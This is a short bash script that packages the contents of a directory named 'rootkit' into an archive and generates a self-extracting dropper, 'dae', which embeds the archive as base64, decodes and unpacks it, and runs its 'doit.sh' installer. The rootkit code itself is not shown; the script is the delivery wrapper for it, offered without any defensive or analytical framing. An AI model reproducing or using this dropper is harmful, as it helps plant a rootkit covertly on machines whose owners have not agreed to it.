#!/bin/bash

cd ..
if [[ -f rk.tar.gz ]]; then
	rm rk.tar.gz
fi
if [[ -d rk ]]; then
	rm -rf rk
fi
mkdir rk
cp ./rootkit/* rk
tar cvzf ./rk.tar.gz ./rk
cp ./rk.tar.gz ./rootkit
cd ->/dev/null
echo -ne "#!/bin/bash\n\necho '" > dae
base64 rk.tar.gz -w0 >> dae
echo -ne "' | base64 -d > rk.tar.gz\n\n" >> dae
echo "tar xvf rk.tar.gz && ./doit.sh" >> dae
echo "" >> dae
if [[ -f dae.gz ]]; then
	rm dae.gz
fi
gzip dae
